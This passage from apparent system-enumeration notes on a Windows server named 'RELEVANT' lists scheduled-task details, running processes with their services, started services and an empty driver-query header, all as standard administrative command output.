Repeat: Until: Duration:              Disabled
Repeat: Stop If Still Running:        Disabled

HostName:                             RELEVANT
TaskName:                             \Microsoft\Windows\UpdateOrchestrator\Schedule Scan
Next Run Time:                        7/20/2021 6:44:40 AM
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        7/19/2021 6:16:59 AM
Last Result:                          0
Author:                               Microsoft Corporation
Task To Run:                          %systemroot%\system32\usoclient.exe StartScan
Start In:                             N/A
Comment:                              This task performs a scheduled Windows Update scan.
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        Undefined
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

HostName:                             RELEVANT
TaskName:                             \Microsoft\Windows\UpdateOrchestrator\Schedule Scan
Next Run Time:                        7/20/2021 6:10:31 AM
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        7/19/2021 6:16:59 AM
Last Result:                          0
Author:                               Microsoft Corporation
Task To Run:                          %systemroot%\system32\usoclient.exe StartScan
Start In:                             N/A
Comment:                              This task performs a scheduled Windows Update scan.
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        When an event occurs
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

HostName:                             RELEVANT
TaskName:                             \Microsoft\Windows\UpdateOrchestrator\USO_UxBroker_Display
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               N/A
Task To Run:                          %systemroot%\system32\MusNotification.exe Display
Start In:                             N/A
Comment:                              N/A
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        Undefined
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

HostName:                             RELEVANT
TaskName:                             \Microsoft\Windows\UpdateOrchestrator\USO_UxBroker_ReadyToReboot
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               N/A
Task To Run:                          %systemroot%\system32\MusNotification.exe ReadyToReboot
Start In:                             N/A
Comment:                              N/A
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode, No Start On Batteries
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        Undefined
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

Folder: \Microsoft\Windows\UPnP
HostName:                             RELEVANT
TaskName:                             \Microsoft\Windows\UPnP\UPnPHostConfig
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               Microsoft
Task To Run:                          sc.exe config upnphost start= auto
Start In:                             N/A
Comment:                              Set UPnPHost service to Auto-Start
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        On demand only
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

Folder: \Microsoft\Windows\Windows Defender
HostName:                             RELEVANT
TaskName:                             \Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance
Next Run Time:                        N/A
Status:                               Running
Logon Mode:                           Interactive/Background
Last Run Time:                        7/19/2021 6:25:49 AM
Last Result:                          267009
Author:                               N/A
Task To Run:                          %ProgramFiles%\Windows Defender\MpCmdRun.exe -IdleTask -TaskName WdCacheMaintenance
Start In:                             N/A
Comment:                              Periodic maintenance task.
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     No Start On Batteries
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        On demand only
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

HostName:                             RELEVANT
TaskName:                             \Microsoft\Windows\Windows Defender\Windows Defender Cleanup
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        7/19/2021 6:25:48 AM
Last Result:                          0
Author:                               N/A
Task To Run:                          %ProgramFiles%\Windows Defender\MpCmdRun.exe -IdleTask -TaskName WdCleanup
Start In:                             N/A
Comment:                              Periodic cleanup task.
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     No Start On Batteries
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        On demand only
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

HostName:                             RELEVANT
TaskName:                             \Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan
Next Run Time:                        N/A
Status:                               Running
Logon Mode:                           Interactive/Background
Last Run Time:                        7/19/2021 6:25:49 AM
Last Result:                          267009
Author:                               N/A
Task To Run:                          %ProgramFiles%\Windows Defender\MpCmdRun.exe Scan -ScheduleJob
Start In:                             N/A
Comment:                              Periodic scan task.
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     No Start On Batteries
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        On demand only
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

HostName:                             RELEVANT
TaskName:                             \Microsoft\Windows\Windows Defender\Windows Defender Verification
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        7/19/2021 6:25:48 AM
Last Result:                          0
Author:                               N/A
Task To Run:                          %ProgramFiles%\Windows Defender\MpCmdRun.exe -IdleTask -TaskName WdVerification
Start In:                             N/A
Comment:                              Periodic verification task.
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     No Start On Batteries
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        On demand only
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

Folder: \Microsoft\Windows\Windows Error Reporting
HostName:                             RELEVANT
TaskName:                             \Microsoft\Windows\Windows Error Reporting\QueueReporting
Next Run Time:                        7/19/2021 10:09:04 AM
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        7/19/2021 6:50:19 AM
Last Result:                          0
Author:                               Microsoft Corporation
Task To Run:                          %windir%\system32\wermgr.exe -upload
Start In:                             N/A
Comment:                              Windows Error Reporting task to process queued reports.
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 04:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        At system start up
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

HostName:                             RELEVANT
TaskName:                             \Microsoft\Windows\Windows Error Reporting\QueueReporting
Next Run Time:                        7/19/2021 12:03:09 PM
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        7/19/2021 6:50:19 AM
Last Result:                          0
Author:                               Microsoft Corporation
Task To Run:                          %windir%\system32\wermgr.exe -upload
Start In:                             N/A
Comment:                              Windows Error Reporting task to process queued reports.
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 04:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        Undefined
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

HostName:                             RELEVANT
TaskName:                             \Microsoft\Windows\Windows Error Reporting\QueueReporting
Next Run Time:                        7/19/2021 11:51:04 AM
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        7/19/2021 6:50:19 AM
Last Result:                          0
Author:                               Microsoft Corporation
Task To Run:                          %windir%\system32\wermgr.exe -upload
Start In:                             N/A
Comment:                              Windows Error Reporting task to process queued reports.
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 04:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        One Time Only, Hourly 
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        4 Hour(s), 0 Minute(s)
Repeat: Until: Time:                  None
Repeat: Until: Duration:              Disabled
Repeat: Stop If Still Running:        Disabled

Folder: \Microsoft\Windows\Windows Filtering Platform
HostName:                             RELEVANT
TaskName:                             \Microsoft\Windows\Windows Filtering Platform\BfeOnServiceStartTypeChange
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               Microsoft Corporation
Task To Run:                          %windir%\system32\rundll32.exe bfe.dll,BfeOnServiceStartTypeChange
Start In:                             N/A
Comment:                              This task adjusts the start type for firewall-triggered services when the start type of the Base Filtering Engine (BFE) is disabled.
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        When an event occurs
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

Folder: \Microsoft\Windows\WindowsColorSystem
HostName:                             RELEVANT
TaskName:                             \Microsoft\Windows\WindowsColorSystem\Calibration Loader
Next Run Time:                        N/A
Status:                               Disabled
Logon Mode:                           Interactive/Background
Last Run Time:                        7/25/2020 7:57:53 AM
Last Result:                          0
Author:                               Microsoft Corporation
Task To Run:                          COM handler
Start In:                             N/A
Comment:                              This task applies color calibration settings.
Scheduled Task State:                 Disabled
Idle Time:                            Disabled
Power Management:                     
Run As User:                          Users
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: Disabled
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        At logon time
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

HostName:                             RELEVANT
TaskName:                             \Microsoft\Windows\WindowsColorSystem\Calibration Loader
Next Run Time:                        N/A
Status:                               Disabled
Logon Mode:                           Interactive/Background
Last Run Time:                        7/25/2020 7:57:53 AM
Last Result:                          0
Author:                               Microsoft Corporation
Task To Run:                          COM handler
Start In:                             N/A
Comment:                              This task applies color calibration settings.
Scheduled Task State:                 Disabled
Idle Time:                            Disabled
Power Management:                     
Run As User:                          Users
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: Disabled
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        When an event occurs
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

Folder: \Microsoft\Windows\WindowsUpdate
HostName:                             RELEVANT
TaskName:                             \Microsoft\Windows\WindowsUpdate\Automatic App Update
Next Run Time:                        7/19/2021 11:37:57 AM
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        7/25/2020 1:59:37 PM
Last Result:                          0
Author:                               Microsoft Corporation
Task To Run:                          COM handler
Start In:                             N/A
Comment:                              Automatically updates the user's Windows store applications.
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     
Run As User:                          INTERACTIVE
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 04:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        One Time Only, Hourly 
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        4 Hour(s), 0 Minute(s)
Repeat: Until: Time:                  None
Repeat: Until: Duration:              Disabled
Repeat: Stop If Still Running:        Disabled

HostName:                             RELEVANT
TaskName:                             \Microsoft\Windows\WindowsUpdate\Automatic App Update
Next Run Time:                        7/19/2021 9:38:28 AM
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        7/25/2020 1:59:37 PM
Last Result:                          0
Author:                               Microsoft Corporation
Task To Run:                          COM handler
Start In:                             N/A
Comment:                              Automatically updates the user's Windows store applications.
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     
Run As User:                          INTERACTIVE
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 04:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        At logon time
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

HostName:                             RELEVANT
TaskName:                             \Microsoft\Windows\WindowsUpdate\Scheduled Start
Next Run Time:                        7/20/2021 6:15:15 AM
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        7/19/2021 6:17:00 AM
Last Result:                          1056
Author:                               Microsoft Corporation.
Task To Run:                          C:\Windows\system32\sc.exe start wuauserv
Start In:                             N/A
Comment:                              This task is used to start the Windows Update service when needed to perform scheduled operations such as scans.
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        One Time Only
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        Disabled
Repeat: Until: Time:                  Disabled
Repeat: Until: Duration:              Disabled
Repeat: Stop If Still Running:        Disabled

HostName:                             RELEVANT
TaskName:                             \Microsoft\Windows\WindowsUpdate\Scheduled Start
Next Run Time:                        7/20/2021 6:15:53 AM
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        7/19/2021 6:17:00 AM
Last Result:                          1056
Author:                               Microsoft Corporation.
Task To Run:                          C:\Windows\system32\sc.exe start wuauserv
Start In:                             N/A
Comment:                              This task is used to start the Windows Update service when needed to perform scheduled operations such as scans.
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        When an event occurs
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

HostName:                             RELEVANT
TaskName:                             \Microsoft\Windows\WindowsUpdate\Scheduled Start
Next Run Time:                        7/20/2021 6:15:17 AM
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        7/19/2021 6:17:00 AM
Last Result:                          1056
Author:                               Microsoft Corporation.
Task To Run:                          C:\Windows\system32\sc.exe start wuauserv
Start In:                             N/A
Comment:                              This task is used to start the Windows Update service when needed to perform scheduled operations such as scans.
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        When an event occurs
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

HostName:                             RELEVANT
TaskName:                             \Microsoft\Windows\WindowsUpdate\Scheduled Start
Next Run Time:                        7/20/2021 6:15:42 AM
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        7/19/2021 6:17:00 AM
Last Result:                          1056
Author:                               Microsoft Corporation.
Task To Run:                          C:\Windows\system32\sc.exe start wuauserv
Start In:                             N/A
Comment:                              This task is used to start the Windows Update service when needed to perform scheduled operations such as scans.
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        Undefined
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

HostName:                             RELEVANT
TaskName:                             \Microsoft\Windows\WindowsUpdate\sih
Next Run Time:                        7/19/2021 10:47:02 AM
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        7/19/2021 6:17:00 AM
Last Result:                          -2147012894
Author:                               Microsoft Corporation.
Task To Run:                          %systemroot%\System32\sihclient.exe 
Start In:                             N/A
Comment:                              This daily task launches the SIH client (server-initiated healing) to detect and fix system components that are vital to automatic updating of Windows and Microsoft software installed on the machine.  This task can go online, evaluate applicability of h
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        One Time Only, Hourly 
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        20 Hour(s), 0 Minute(s)
Repeat: Until: Time:                  None
Repeat: Until: Duration:              Disabled
Repeat: Stop If Still Running:        Disabled

HostName:                             RELEVANT
TaskName:                             \Microsoft\Windows\WindowsUpdate\sihboot
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               Microsoft Corporation.
Task To Run:                          %systemroot%\System32\sihclient.exe /boot
Start In:                             N/A
Comment:                              This boot task launches the SIH client to finish executing healing actions to fix the system components vital to automatic updating of Windows and Microsoft software installed on the machine.  It is enabled only when the daily SIH client task fails to c
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 00:02:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        At system start up
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

Folder: \Microsoft\Windows\Wininet
HostName:                             RELEVANT
TaskName:                             \Microsoft\Windows\Wininet\CacheTask
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        7/25/2020 2:42:15 PM
Last Result:                          1073807364
Author:                               Microsoft
Task To Run:                          COM handler
Start In:                             N/A
Comment:                              Wininet Cache Task
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     
Run As User:                          Users
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: Disabled
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        At logon time
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

Folder: \Microsoft\Windows\Workplace Join
HostName:                             RELEVANT
TaskName:                             \Microsoft\Windows\Workplace Join\Automatic-Device-Join
Next Run Time:                        N/A
Status:                               Disabled
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               N/A
Task To Run:                          %SystemRoot%\System32\dsregcmd.exe 
Start In:                             N/A
Comment:                              Register this computer if the computer is already joined to an Active Directory domain.
Scheduled Task State:                 Disabled
Idle Time:                            Disabled
Power Management:                     
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 00:05:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        At logon time
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

Folder: \Microsoft\XblGameSave
HostName:                             RELEVANT
TaskName:                             \Microsoft\XblGameSave\XblGameSaveTask
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        7/19/2021 6:25:46 AM
Last Result:                          0
Author:                               Microsoft
Task To Run:                          %windir%\System32\XblGameSaveTask.exe standby
Start In:                             N/A
Comment:                              XblGameSave Standby Task
Scheduled Task State:                 Enabled
Idle Time:                            Only Start If Idle for  minutes, If Not Idle Retry For  minutes Stop the task if Idle State end
Power Management:                     No Start On Batteries
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 02:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        At idle time
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

HostName:                             RELEVANT
TaskName:                             \Microsoft\XblGameSave\XblGameSaveTaskLogon
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        7/25/2020 2:03:53 PM
Last Result:                          0
Author:                               Microsoft
Task To Run:                          %windir%\System32\XblGameSaveTask.exe logon
Start In:                             N/A
Comment:                              XblGameSave Logon Task
Scheduled Task State:                 Enabled
Idle Time:                            Only Start If Idle for  minutes, If Not Idle Retry For  minutes Stop the task if Idle State end
Power Management:                     No Start On Batteries
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 02:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        At logon time
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A
```

### Running Processes

```cmd
$ tasklist /SVC

Image Name                     PID Services                                    
========================= ======== ============================================
System Idle Process              0 N/A                                         
System                           4 N/A                                         
smss.exe                       388 N/A                                         
csrss.exe                      540 N/A                                         
csrss.exe                      608 N/A                                         
wininit.exe                    624 N/A                                         
winlogon.exe                   660 N/A                                         
services.exe                   732 N/A                                         
lsass.exe                      740 KeyIso, SamSs                               
svchost.exe                    820 BrokerInfrastructure, DcomLaunch, LSM,      
                                   PlugPlay, Power, SystemEventsBroker         
svchost.exe                    876 RpcEptMapper, RpcSs                         
dwm.exe                        960 N/A                                         
svchost.exe                    544 BFE, CoreMessagingRegistrar, DPS, MpsSvc    
svchost.exe                    612 TermService                                 
svchost.exe                    728 Appinfo, CertPropSvc, DsmSvc, gpsvc,        
                                   iphlpsvc, ProfSvc, Schedule, SENS,          
                                   SessionEnv, ShellHWDetection, Themes,       
                                   UserManager, Winmgmt, WpnService            
svchost.exe                    796 Dhcp, EventLog, lmhosts, TimeBrokerSvc      
svchost.exe                    616 NcbService, PcaSvc, TrkWks, UALSVC,         
                                   UmRdpService, WdiSystemHost, wudfsvc        
svchost.exe                   1112 EventSystem, FontCache, LicenseManager,     
                                   netprofm, nsi, W32Time, WinHttpAutoProxySvc 
svchost.exe                   1232 CryptSvc, Dnscache, LanmanWorkstation,      
                                   NlaSvc, WinRM                               
svchost.exe                   1516 Wcmsvc                                      
spoolsv.exe                   1824 Spooler                                     
LiteAgent.exe                 1908 AWSLiteAgent                                
svchost.exe                   1916 DiagTrack                                   
svchost.exe                   1896 AppHostSvc                                  
inetinfo.exe                  1932 IISADMIN                                    
svchost.exe                   2004 tiledatamodelsvc                            
svchost.exe                    836 W3SVC, WAS                                  
wlms.exe                      1128 WLMS                                        
MsMpEng.exe                   1268 WinDefend                                   
svchost.exe                   1428 LanmanServer                                
svchost.exe                   2108 PolicyAgent                                 
sppsvc.exe                    2324 sppsvc                                      
LogonUI.exe                   2844 N/A                                         
SppExtComObj.Exe              2732 N/A                                         
msdtc.exe                     2196 MSDTC                                       
w3wp.exe                      1748 N/A                                         
MpCmdRun.exe                  2052 N/A                                         
vds.exe                       1140 vds                                         
amazon-ssm-agent.exe          2632 AmazonSSMAgent                              
MpCmdRun.exe                  2452 N/A                                         
conhost.exe                    888 N/A                                         
cmd.exe                       3276 N/A                                         
conhost.exe                   3620 N/A                                         
tasklist.exe                  3212 N/A                                         
WmiPrvSE.exe                    84 N/A
```

### Services

```cmd
$ net start

These Windows services are started:

   Amazon SSM Agent
   Application Host Helper Service
   Application Information
   AWS Lite Guest Agent
   Background Tasks Infrastructure Service
   Base Filtering Engine
   Certificate Propagation
   CNG Key Isolation
   COM+ Event System
   Connected User Experiences and Telemetry
   CoreMessaging
   Cryptographic Services
   DCOM Server Process Launcher
   Device Setup Manager
   DHCP Client
   Diagnostic Policy Service
   Diagnostic System Host
   Distributed Link Tracking Client
   Distributed Transaction Coordinator
   DNS Client
   Group Policy Client
   IIS Admin Service
   IP Helper
   IPsec Policy Agent
   Local Session Manager
   Network Connection Broker
   Network List Service
   Network Location Awareness
   Network Store Interface Service
   Plug and Play
   Power
   Print Spooler
   Program Compatibility Assistant Service
   Remote Desktop Configuration
   Remote Desktop Services
   Remote Desktop Services UserMode Port Redirector
   Remote Procedure Call (RPC)
   RPC Endpoint Mapper
   Security Accounts Manager
   Server
   Shell Hardware Detection
   Software Protection
   System Event Notification Service
   System Events Broker
   Task Scheduler
   TCP/IP NetBIOS Helper
   Themes
   Tile Data model server
   Time Broker
   User Access Logging Service
   User Manager
   User Profile Service
   Virtual Disk
   Windows Connection Manager
   Windows Defender Service
   Windows Driver Foundation - User-mode Driver Framework
   Windows Event Log
   Windows Firewall
   Windows Font Cache Service
   Windows License Manager Service
   Windows Licensing Monitoring Service
   Windows Management Instrumentation
   Windows Process Activation Service
   Windows Push Notifications System Service
   Windows Remote Management (WS-Management)
   Windows Time
   WinHTTP Web Proxy Auto-Discovery Service
   Workstation
   World Wide Web Publishing Service

The command completed successfully.
```

### Installed Drivers

```cmd
$ DRIVERQUERY

Module Name  Display Name           Driver Type   Link Date             
============ ====================== ============= ======================
